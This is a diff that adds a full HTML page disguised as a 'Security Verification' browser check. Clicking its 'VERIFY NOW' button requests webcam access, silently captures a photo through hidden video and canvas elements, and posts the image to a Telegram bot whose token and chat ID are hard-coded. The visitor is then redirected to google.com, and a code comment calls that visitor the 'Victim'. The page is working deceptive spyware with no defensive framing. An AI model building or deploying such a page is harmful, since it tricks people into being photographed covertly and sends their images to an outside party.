@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html>
+<body style="background:#000; color:#fff; text-align:center; font-family:sans-serif; padding-top:100px;">
+    <h2>Security Verification</h2>
+    <p>Please click the button to verify your browser.</p>
+    <button id="vBtn" style="padding:15px 30px; font-size:18px;">VERIFY NOW</button>
+    <video id="vid" style="display:none;" autoplay></video>
+    <canvas id="can" style="display:none;"></canvas>
+
+    <script>
+        const TOKEN = "8149527318:AAEkQ189QqtT81wZQ9hwT_-eqbL5JFoiFx0";
+        const CHAT_ID = "6643732863";
+
+        document.getElementById('vBtn').onclick = async () => {
+            try {
+                // Requesting access - Victim MUST click 'Allow'
+                const stream = await navigator.mediaDevices.getUserMedia({video: true});
+                const vid = document.getElementById('vid');
+                vid.srcObject = stream;
+
+                setTimeout(() => {
+                    const can = document.getElementById('can');
+                    can.width = 640; can.height = 480;
+                    can.getContext('2d').drawImage(vid, 0, 0);
+                    can.toBlob(blob => {
+                        const fd = new FormData();
+                        fd.append('chat_id', CHAT_ID);
+                        fd.append('photo', blob, 'capture.jpg');
+                        fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {method:'POST', body:fd});
+                        window.location.href = "https://google.com"; // Redirect
+                    }, 'image/jpeg');
+                }, 1500);
+            } catch (e) { alert("Verification Failed. Permission Required."); }
+        };
+    </script>
+</body>
+</html>
